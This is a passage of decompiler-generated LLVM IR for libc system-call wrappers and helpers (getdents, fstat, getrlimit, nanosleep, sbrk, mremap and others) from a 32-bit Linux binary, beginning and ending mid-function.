  %v1_8053c3f = call i32 @int80_syscall(i32 102)
  store i32 %v0_8053c38, i32* @ebx, align 4
  store i32 %v1_8053c3f, i32* @edx, align 4
  %tmp3 = icmp ult i32 %v1_8053c3f, -4095
  br i1 %tmp3, label %dec_label_pc_8053c5a, label %dec_label_pc_8053c4d

dec_label_pc_8053c4d:                             ; preds = %entry
  %v1_8053c52 = sub i32 0, %v1_8053c3f
  store i32 %v1_8053c52, i32* @edx, align 4
  store i32 %v1_8053c52, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8053c5a

dec_label_pc_8053c5a:                             ; preds = %entry, %dec_label_pc_8053c4d
  %v0_8053c5a = phi i32 [ %v1_8053c3f, %entry ], [ -1, %dec_label_pc_8053c4d ]
  ret i32 %v0_8053c5a

; uselistorder directives
  uselistorder i32 %v1_8053c3f, { 1, 2, 0, 3 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053c5a, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp6 = inttoptr i32 %arg3 to %sigaction*
  %v7_8053c75 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp6)
  %tmp11 = icmp ult i32 %v7_8053c75, -4095
  br i1 %tmp11, label %dec_label_pc_8053c8f, label %dec_label_pc_8053c82

dec_label_pc_8053c82:                             ; preds = %entry
  %v1_8053c87 = sub i32 0, %v7_8053c75
  store i32 %v1_8053c87, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8053c8f

dec_label_pc_8053c8f:                             ; preds = %entry, %dec_label_pc_8053c82
  %v0_8053c90 = phi i32 [ %v7_8053c75, %entry ], [ -1, %dec_label_pc_8053c82 ]
  ret i32 %v0_8053c90

; uselistorder directives
  uselistorder i32 %v7_8053c75, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053c8f, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 -8, i32* %ecx.global-to-local, align 4
  %v1_8053ca6 = call i32 @int80_syscall(i32 252)
  store i32 -8, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8053ca6, -4095
  br i1 %tmp8, label %dec_label_pc_8053cbd, label %dec_label_pc_8053cb3

dec_label_pc_8053cb3:                             ; preds = %entry
  %v1_8053cb8 = sub i32 0, %v1_8053ca6
  store i32 %v1_8053cb8, i32* inttoptr (i32 -8 to i32*), align 8
  %v0_8053cbd.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cbd.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053cbd

dec_label_pc_8053cbd:                             ; preds = %entry, %dec_label_pc_8053cb3
  %v1_8053cbd = phi i32 [ %arg1, %entry ], [ %v1_8053cbd.pre, %dec_label_pc_8053cb3 ]
  %v0_8053cbd = phi i32 [ -8, %entry ], [ %v0_8053cbd.pre, %dec_label_pc_8053cb3 ]
  store i32 %v1_8053cbd, i32* @ebx, align 4
  store i32 %v0_8053cbd, i32* %ecx.global-to-local, align 4
  call void @exit(i32 %v1_8053cbd)
  unreachable

; uselistorder directives
  uselistorder i32 %v1_8053cbd, { 1, 0 }
  uselistorder i32 %v1_8053ca6, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053cbd, { 1, 0 }
}

define i32 @fstat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i32, align 4
  %v0_8053cd8 = load i32, i32* @ebx, align 4
  %tmp7 = bitcast i32* %stack_var_-100 to %stat64*
  %v4_8053ce9 = call i32 @fstat64(i32 %arg1, %stat64* %tmp7)
  %tmp8 = icmp ult i32 %v4_8053ce9, -4095
  br i1 %tmp8, label %dec_label_pc_8053d05, label %dec_label_pc_8053cf6

dec_label_pc_8053cf6:                             ; preds = %entry
  store i32 -1, i32* @ebx, align 4
  %v1_8053cfe = sub i32 0, %v4_8053ce9
  store i32 %v1_8053cfe, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8053d17

dec_label_pc_8053d05:                             ; preds = %entry
  store i32 %v4_8053ce9, i32* @ebx, align 4
  %v1_8053d07 = icmp eq i32 %v4_8053ce9, 0
  %v1_8053d09 = icmp eq i1 %v1_8053d07, false
  br i1 %v1_8053d09, label %dec_label_pc_8053d17, label %dec_label_pc_8053d0b

dec_label_pc_8053d0b:                             ; preds = %dec_label_pc_8053d05
  %v3_8053d10 = call i32 @__xstat32_conv(i32* nonnull %stack_var_-100, i32 %arg2)
  br label %dec_label_pc_8053d17

dec_label_pc_8053d17:                             ; preds = %dec_label_pc_8053d05, %dec_label_pc_8053cf6, %dec_label_pc_8053d0b
  %v0_8053d17 = load i32, i32* @ebx, align 4
  store i32 %v0_8053cd8, i32* @ebx, align 4
  ret i32 %v0_8053d17

; uselistorder directives
  uselistorder i32 %v4_8053ce9, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053d17, { 2, 0, 1 }
}

define i32 @__getdents(i32 %arg1, %linux_dirent* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8053d21 = load i32, i32* @edi, align 4
  %v0_8053d22 = load i32, i32* @esi, align 4
  %v0_8053d23 = load i32, i32* @ebx, align 4
  store i32 %v0_8053d23, i32* %stack_var_-16, align 4
  %v4_8053d27 = ptrtoint %linux_dirent* %arg2 to i32
  store i32 %v4_8053d27, i32* @ecx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v5_8053d3b = call i32 @getdents(i32 %arg1, %linux_dirent* %arg2, i32 %arg3)
  store i32 %v0_8053d23, i32* %ebx.global-to-local, align 4
  %tmp27 = icmp ult i32 %v5_8053d3b, -4095
  br i1 %tmp27, label %dec_label_pc_8053d56, label %dec_label_pc_8053d47

dec_label_pc_8053d47:                             ; preds = %entry
  store i32 -1, i32* @edi, align 4
  %v1_8053d4f = sub i32 0, %v5_8053d3b
  store i32 %v1_8053d4f, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8053d9b

dec_label_pc_8053d56:                             ; preds = %entry
  store i32 %v5_8053d3b, i32* @edi, align 4
  store i32 %v4_8053d27, i32* @esi, align 4
  %v3_8053d5f = add i32 %v5_8053d3b, %v4_8053d27
  store i32 %v3_8053d5f, i32* %ebp.global-to-local, align 4
  %v7_8053d976 = icmp ult i32 %v4_8053d27, %v3_8053d5f
  br i1 %v7_8053d976, label %dec_label_pc_8053d64.lr.ph, label %dec_label_pc_8053d9b

dec_label_pc_8053d64.lr.ph:                       ; preds = %dec_label_pc_8053d56
  br label %dec_label_pc_8053d64

dec_label_pc_8053d64:                             ; preds = %dec_label_pc_8053d64.lr.ph, %dec_label_pc_8053d64
  %v0_8053d6b = phi i32 [ %v4_8053d27, %dec_label_pc_8053d64.lr.ph ], [ %v2_8053d95, %dec_label_pc_8053d64 ]
  %v1_8053d64 = add i32 %v0_8053d6b, 8
  %v2_8053d64 = inttoptr i32 %v1_8053d64 to i16*
  %v3_8053d64 = load i16, i16* %v2_8053d64, align 2
  %v4_8053d64 = zext i16 %v3_8053d64 to i32
  %v1_8053d68 = add i32 %v0_8053d6b, 10
  store i32 %v1_8053d68, i32* %ebx.global-to-local, align 4
  %v2_8053d6b = add i32 %v0_8053d6b, -1
  %v3_8053d6b = add i32 %v2_8053d6b, %v4_8053d64
  %v4_8053d6b = inttoptr i32 %v3_8053d6b to i8*
  %v5_8053d6b = load i8, i8* %v4_8053d6b, align 1
  %v5_8053d73 = inttoptr i32 %v1_8053d68 to i8*
  %v4_8053d74 = call i32 @strlen(i8* %v5_8053d73)
  %v1_8053d79 = add i32 %v4_8053d74, 1
  %v0_8053d7d = load i32, i32* @esi, align 4
  %v1_8053d7d = add i32 %v0_8053d7d, 11
  %v0_8053d80 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8053d82 = inttoptr i32 %v1_8053d7d to i8*
  %v5_8053d82 = call i32 @memmove(i8* %v4_8053d82, i32 %v0_8053d80, i32 %v1_8053d79)
  %v2_8053d8b = load i32, i32* @esi, align 4
  %v3_8053d8b = add i32 %v2_8053d8b, 10
  %v4_8053d8b = inttoptr i32 %v3_8053d8b to i8*
  store i8 %v5_8053d6b, i8* %v4_8053d8b, align 1
  %v0_8053d91 = load i32, i32* @esi, align 4
  %v1_8053d91 = add i32 %v0_8053d91, 8
  %v2_8053d91 = inttoptr i32 %v1_8053d91 to i16*
  %v3_8053d91 = load i16, i16* %v2_8053d91, align 2
  %v4_8053d91 = zext i16 %v3_8053d91 to i32
  %v2_8053d95 = add i32 %v4_8053d91, %v0_8053d91
  store i32 %v2_8053d95, i32* @esi, align 4
  %v1_8053d97 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8053d97 = icmp ult i32 %v2_8053d95, %v1_8053d97
  br i1 %v7_8053d97, label %dec_label_pc_8053d64, label %dec_label_pc_8053d9b.loopexit

dec_label_pc_8053d9b.loopexit:                    ; preds = %dec_label_pc_8053d64
  %v2_8053d9e.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8053d9b

dec_label_pc_8053d9b:                             ; preds = %dec_label_pc_8053d9b.loopexit, %dec_label_pc_8053d56, %dec_label_pc_8053d47
  %v2_8053d9e = phi i32 [ %v2_8053d9e.pre, %dec_label_pc_8053d9b.loopexit ], [ %v0_8053d23, %dec_label_pc_8053d56 ], [ %v0_8053d23, %dec_label_pc_8053d47 ]
  %v0_8053d9b = load i32, i32* @edi, align 4
  store i32 %v2_8053d9e, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053d22, i32* @esi, align 4
  store i32 %v0_8053d21, i32* @edi, align 4
  ret i32 %v0_8053d9b

; uselistorder directives
  uselistorder i32 %v2_8053d95, { 1, 2, 0 }
  uselistorder i32 %v0_8053d6b, { 0, 2, 1 }
  uselistorder i32 %v5_8053d3b, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8053d27, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8053d23, { 1, 2, 0, 3 }
  uselistorder i32 (i8*, i32, i32)* @memmove, { 2, 1, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053d64, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v15_8053da4 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8053dac = call i32 @getrlimit(i32 7, i32 %v15_8053da4)
  %v2_8053db2 = icmp slt i32 %v2_8053dac, 0
  %v2_8053dc1.pre = load i32, i32* %stack_var_-8, align 4
  %.v2_8053dc1.pre = select i1 %v2_8053db2, i32 256, i32 %v2_8053dc1.pre
  ret i32 %.v2_8053dc1.pre
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_8053dc9 = call i32 @int80_syscall(i32 202)
  ret i32 %v1_8053dc9
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_8053dd1 = call i32 @int80_syscall(i32 201)
  ret i32 %v1_8053dd1
}

define i32 @getgid() local_unnamed_addr {
entry:
  %v1_8053dd9 = call i32 @int80_syscall(i32 200)
  ret i32 %v1_8053dd9
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8053ddc = load i32, i32* @global_var_80582ec.329, align 4
  %v1_8053de6 = icmp eq i32 %v0_8053ddc, 0
  br i1 %v1_8053de6, label %dec_label_pc_8053dec, label %dec_label_pc_8053dea

dec_label_pc_8053dea:                             ; preds = %entry
  br label %dec_label_pc_8053dec

dec_label_pc_8053dec:                             ; preds = %entry, %dec_label_pc_8053dea
  %v0_8053dec = phi i32 [ 4096, %entry ], [ %v0_8053ddc, %dec_label_pc_8053dea ]
  ret i32 %v0_8053dec

; uselistorder directives
  uselistorder label %dec_label_pc_8053dec, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8053dff = call i32 @int80_syscall(i32 191)
  %tmp3 = icmp ult i32 %v1_8053dff, -4095
  br i1 %tmp3, label %dec_label_pc_8053e1a, label %dec_label_pc_8053e0d

dec_label_pc_8053e0d:                             ; preds = %entry
  %v1_8053e12 = sub i32 0, %v1_8053dff
  store i32 %v1_8053e12, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8053e1a

dec_label_pc_8053e1a:                             ; preds = %entry, %dec_label_pc_8053e0d
  %v0_8053e1a = phi i32 [ %v1_8053dff, %entry ], [ -1, %dec_label_pc_8053e0d ]
  ret i32 %v0_8053e1a

; uselistorder directives
  uselistorder i32 %v1_8053dff, { 1, 2, 0 }
  uselistorder i32 191, { 1, 0 }
  uselistorder label %dec_label_pc_8053e1a, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_8053e21 = call i32 @int80_syscall(i32 199)
  ret i32 %v1_8053e21
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8053e24 = load i32, i32* @edi, align 4
  %v0_8053e25 = load i32, i32* @esi, align 4
  store i32 %v0_8053e25, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8053e3a = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8053e42 = call i32 @mremap(i32 %v0_8053e3a, i32 %v0_8053e25, i32 %v0_8053e24, i32 %tmp6, i32 %arg1, i32 %arg2)
  %tmp10 = icmp ult i32 %v6_8053e42, -4095
  br i1 %tmp10, label %dec_label_pc_8053e5c, label %dec_label_pc_8053e4f

dec_label_pc_8053e4f:                             ; preds = %entry
  %v1_8053e54 = sub i32 0, %v6_8053e42
  store i32 %v1_8053e54, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8053e5c

dec_label_pc_8053e5c:                             ; preds = %entry, %dec_label_pc_8053e4f
  %v0_8053e5e = phi i32 [ %v6_8053e42, %entry ], [ -1, %dec_label_pc_8053e4f ]
  %v2_8053e5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053e5c, i32* @esi, align 4
  store i32 %v0_8053e24, i32* @edi, align 4
  ret i32 %v0_8053e5e

; uselistorder directives
  uselistorder i32 %v6_8053e42, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053e5c, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_8053e6f = call i32 @munmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %tmp3 = icmp ult i32 %v2_8053e6f, -4095
  br i1 %tmp3, label %dec_label_pc_8053e8a, label %dec_label_pc_8053e7d

dec_label_pc_8053e7d:                             ; preds = %entry
  %v1_8053e82 = sub i32 0, %v2_8053e6f
  store i32 %v1_8053e82, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8053e8a

dec_label_pc_8053e8a:                             ; preds = %entry, %dec_label_pc_8053e7d
  %v0_8053e8a = phi i32 [ %v2_8053e6f, %entry ], [ -1, %dec_label_pc_8053e7d ]
  ret i32 %v0_8053e8a

; uselistorder directives
  uselistorder i32 %v2_8053e6f, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @munmap, { 1, 0 }
  uselistorder label %dec_label_pc_8053e8a, { 1, 0 }
}

define i32 @__syscall_nanosleep(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8053e8c = load i32, i32* @edx, align 4
  %v1_8053e8c = inttoptr i32 %v0_8053e8c to %timespec*
  %v0_8053e8e = load i32, i32* @ebx, align 4
  store i32 %v0_8053e8e, i32* %stack_var_-4, align 4
  %v0_8053e8f = load i32, i32* @eax, align 4
  %v2_8053e91 = inttoptr i32 %v0_8053e8f to %timespec*
  %v6_8053e98 = call i32 @nanosleep(%timespec* %v2_8053e91, %timespec* %v1_8053e8c)
  %tmp3 = icmp ult i32 %v6_8053e98, -4095
  br i1 %tmp3, label %dec_label_pc_8053eb3, label %dec_label_pc_8053ea6

dec_label_pc_8053ea6:                             ; preds = %entry
  %v1_8053eab = sub i32 0, %v6_8053e98
  store i32 %v1_8053eab, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8053eb3

dec_label_pc_8053eb3:                             ; preds = %entry, %dec_label_pc_8053ea6
  %v0_8053eb4 = phi i32 [ %v6_8053e98, %entry ], [ -1, %dec_label_pc_8053ea6 ]
  %v2_8053eb3 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053eb3, i32* @ebx, align 4
  ret i32 %v0_8053eb4

; uselistorder directives
  uselistorder i32 %v6_8053e98, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053eb3, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053eb5 = load i32, i32* @edi, align 4
  %v0_8053eb6 = load i32, i32* @esi, align 4
  %v0_8053eb7 = load i32, i32* @ebx, align 4
  store i32 %v0_8053eb7, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8053ec0 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8053ec6 = icmp eq i32 %v0_8053ec0, 0
  %v1_8053ec8 = icmp eq i1 %v1_8053ec6, false
  br i1 %v1_8053ec8, label %entry.dec_label_pc_8053ed3_crit_edge, label %dec_label_pc_8053eca

entry.dec_label_pc_8053ed3_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8053ed3

dec_label_pc_8053eca:                             ; preds = %entry
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %v0_8053eb7, i32* @ebx, align 4
  store i32 %v0_8053eb5, i32* %edi.global-to-local, align 4
  %v3_8053ed1 = call i32 @__syscall_nanosleep(i32 %v0_8053eb7, i32 %v0_8053eb6, i32 %v0_8053eb5)
  %v0_8053ed3.pre = load i32, i32* %stack_var_-12, align 4
  %v3_8053ed3.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_8053ed3

dec_label_pc_8053ed3:                             ; preds = %entry.dec_label_pc_8053ed3_crit_edge, %dec_label_pc_8053eca
  %v3_8053ed3 = phi i32 [ %tmp6, %entry.dec_label_pc_8053ed3_crit_edge ], [ %v3_8053ed3.pre, %dec_label_pc_8053eca ]
  %v0_8053ed3 = phi i32 [ %v0_8053eb7, %entry.dec_label_pc_8053ed3_crit_edge ], [ %v0_8053ed3.pre, %dec_label_pc_8053eca ]
  %v4_8053ed3 = call i32 @__libc_enable_asynccancel(i32 %v0_8053ed3, i32 %v0_8053eb6, i32 %v0_8053eb5, i32 %v3_8053ed3)
  %v0_8053ed8 = load i32, i32* @ebx, align 4
  store i32 %v0_8053ed8, i32* @edx, align 4
  store i32 %v4_8053ed3, i32* @esi, align 4
  %v0_8053edc = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8053edc, i32* @eax, align 4
  %v0_8053ede = load i32, i32* %stack_var_-12, align 4
  %v3_8053ede = call i32 @__syscall_nanosleep(i32 %v0_8053ede, i32 %v0_8053eb6, i32 %v0_8053eb5)
  store i32 %v3_8053ede, i32* @ebx, align 4
  %v0_8053ee5 = load i32, i32* @esi, align 4
  store i32 %v0_8053ee5, i32* @eax, align 4
  %v1_8053ee7 = call i32 @__libc_disable_asynccancel(i32 %v0_8053ede)
  %v0_8053eec = load i32, i32* @ebx, align 4
  %v2_8053eee = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053eee, i32* @ebx, align 4
  store i32 %v0_8053eb6, i32* @esi, align 4
  store i32 %v0_8053eb5, i32* @edi, align 4
  ret i32 %v0_8053eec

; uselistorder directives
  uselistorder i32 %v0_8053eb6, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8053eb5, { 1, 2, 0, 4, 3 }
  uselistorder i32* %stack_var_-12, { 2, 1, 0, 3 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 10, 4, 5, 1, 2, 11, 9, 12, 8, 7, 13, 6, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_enable_asynccancel, { 10, 4, 5, 1, 2, 11, 9, 12, 8, 7, 13, 6, 3, 0 }
  uselistorder label %dec_label_pc_8053ed3, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8053ef5 = load i32, i32* @ebx, align 4
  store i32 %v0_8053ef5, i32* %stack_var_-8, align 4
  %v0_8053efa = load i32, i32* @global_var_805a854.335, align 4
  %v1_8053efa = icmp eq i32 %v0_8053efa, 0
  %v1_8053f01 = icmp eq i1 %v1_8053efa, false
  br i1 %v1_8053f01, label %dec_label_pc_8053f0f, label %dec_label_pc_8053f03

dec_label_pc_8053f03:                             ; preds = %entry
  %v2_8053f05 = call i32 @__GI_brk(i32* null)
  %v2_8053f0b = icmp slt i32 %v2_8053f05, 0
  br i1 %v2_8053f0b, label %dec_label_pc_8053f2c, label %dec_label_pc_8053f03.dec_label_pc_8053f0f_crit_edge

dec_label_pc_8053f03.dec_label_pc_8053f0f_crit_edge: ; preds = %dec_label_pc_8053f03
  %v0_8053f11.pre = load i32, i32* @global_var_805a854.335, align 4
  br label %dec_label_pc_8053f0f

dec_label_pc_8053f0f:                             ; preds = %dec_label_pc_8053f03.dec_label_pc_8053f0f_crit_edge, %entry
  %v0_8053f11 = phi i32 [ %v0_8053f11.pre, %dec_label_pc_8053f03.dec_label_pc_8053f0f_crit_edge ], [ %v0_8053efa, %entry ]
  %v1_8053f0f = icmp eq i32 %arg1, 0
  %v1_8053f16 = icmp eq i1 %v1_8053f0f, false
  store i32 %v0_8053f11, i32* @ebx, align 4
  br i1 %v1_8053f16, label %dec_label_pc_8053f1c, label %dec_label_pc_8053f2f

dec_label_pc_8053f1c:                             ; preds = %dec_label_pc_8053f0f
  %v2_8053f1e = add i32 %v0_8053f11, %arg1
  %v1_8053f22 = inttoptr i32 %v2_8053f1e to i32*
  %v2_8053f22 = call i32 @__GI_brk(i32* %v1_8053f22)
  %v2_8053f28 = icmp slt i32 %v2_8053f22, 0
  %v1_8053f2a = icmp eq i1 %v2_8053f28, false
  br i1 %v1_8053f2a, label %dec_label_pc_8053f1c.dec_label_pc_8053f2f_crit_edge, label %dec_label_pc_8053f2c

dec_label_pc_8053f1c.dec_label_pc_8053f2f_crit_edge: ; preds = %dec_label_pc_8053f1c
  %v0_8053f2f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053f2f

dec_label_pc_8053f2c:                             ; preds = %dec_label_pc_8053f1c, %dec_label_pc_8053f03
  br label %dec_label_pc_8053f2f

dec_label_pc_8053f2f:                             ; preds = %dec_label_pc_8053f1c.dec_label_pc_8053f2f_crit_edge, %dec_label_pc_8053f0f, %dec_label_pc_8053f2c
  %v0_8053f2f = phi i32 [ %v0_8053f2f.pre, %dec_label_pc_8053f1c.dec_label_pc_8053f2f_crit_edge ], [ %v0_8053f11, %dec_label_pc_8053f0f ], [ -1, %dec_label_pc_8053f2c ]
  %v2_8053f31 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053f31, i32* @ebx, align 4
  ret i32 %v0_8053f2f

; uselistorder directives
  uselistorder i32 %v0_8053f11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053f2f, { 2, 0, 1 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8053f3f = call i32 @times(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_8053f3f

; uselistorder directives
  uselistorder i32 (i32)* @times, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053f46 = load i32, i32* @ebx, align 4
  store i32 %v0_8053f46, i32* %stack_var_-12, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  %v5_8053f5b = call i8* @_memset(i8* %tmp4, i32 0, i32 24)
  %v2_8053f5d = load i32, i32* %arg1, align 4
  store i32 %v2_8053f5d, i32* %eax.global-to-local, align 4
  %v1_8053f5f = add i32 %tmp2, 4
  %v2_8053f5f = inttoptr i32 %v1_8053f5f to i32*
  %v3_8053f5f = load i32, i32* %v2_8053f5f, align 4
  store i32 %v3_8053f5f, i32* %edx.global-to-local, align 4
  %v1_8053f62 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f62 = add i32 %v1_8053f62, 4
  %v3_8053f62 = inttoptr i32 %v2_8053f62 to i32*
  store i32 %v3_8053f5f, i32* %v3_8053f62, align 4
  %v0_8053f65 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f65 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f65 = inttoptr i32 %v1_8053f65 to i32*
  store i32 %v0_8053f65, i32* %v2_8053f65, align 4
  %v0_8053f67 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f67 = add i32 %v0_8053f67, 88
  %v2_8053f67 = inttoptr i32 %v1_8053f67 to i32*
  %v3_8053f67 = load i32, i32* %v2_8053f67, align 4
  store i32 %v3_8053f67, i32* %eax.global-to-local, align 4
  %v1_8053f6a = add i32 %v0_8053f67, 92
  %v2_8053f6a = inttoptr i32 %v1_8053f6a to i32*
  %v3_8053f6a = load i32, i32* %v2_8053f6a, align 4
  store i32 %v3_8053f6a, i32* %edx.global-to-local, align 4
  %v1_8053f6d = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f6d = add i32 %v1_8053f6d, 88
  %v3_8053f6d = inttoptr i32 %v2_8053f6d to i32*
  store i32 %v3_8053f67, i32* %v3_8053f6d, align 4
  %v0_8053f70 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f70 = add i32 %v0_8053f70, 12
  %v2_8053f70 = inttoptr i32 %v1_8053f70 to i32*
  %v3_8053f70 = load i32, i32* %v2_8053f70, align 4
  store i32 %v3_8053f70, i32* %eax.global-to-local, align 4
  %v1_8053f73 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f73 = add i32 %v1_8053f73, 12
  %v3_8053f73 = inttoptr i32 %v2_8053f73 to i32*
  store i32 %v3_8053f70, i32* %v3_8053f73, align 4
  %v0_8053f76 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f76 = add i32 %v0_8053f76, 16
  %v2_8053f76 = inttoptr i32 %v1_8053f76 to i32*
  %v3_8053f76 = load i32, i32* %v2_8053f76, align 4
  store i32 %v3_8053f76, i32* %eax.global-to-local, align 4
  %v1_8053f79 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f79 = add i32 %v1_8053f79, 16
  %v3_8053f79 = inttoptr i32 %v2_8053f79 to i32*
  store i32 %v3_8053f76, i32* %v3_8053f79, align 4
  %v0_8053f7c = load i32, i32* %edx.global-to-local, align 4
  %v1_8053f7c = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f7c = add i32 %v1_8053f7c, 92
  %v3_8053f7c = inttoptr i32 %v2_8053f7c to i32*
  store i32 %v0_8053f7c, i32* %v3_8053f7c, align 4
  %v0_8053f7f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f7f = add i32 %v0_8053f7f, 20
  %v2_8053f7f = inttoptr i32 %v1_8053f7f to i32*
  %v3_8053f7f = load i32, i32* %v2_8053f7f, align 4
  store i32 %v3_8053f7f, i32* %eax.global-to-local, align 4
  %v0_8053f82 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053f82 = add i32 %v0_8053f82, 36
  %v2_8053f82 = inttoptr i32 %v1_8053f82 to i32*
  store i32 0, i32* %v2_8053f82, align 4
  %v0_8053f89 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f89 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f89 = add i32 %v1_8053f89, 20
  %v3_8053f89 = inttoptr i32 %v2_8053f89 to i32*
  store i32 %v0_8053f89, i32* %v3_8053f89, align 4
  %v0_8053f8c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f8c = add i32 %v0_8053f8c, 24
  %v2_8053f8c = inttoptr i32 %v1_8053f8c to i32*
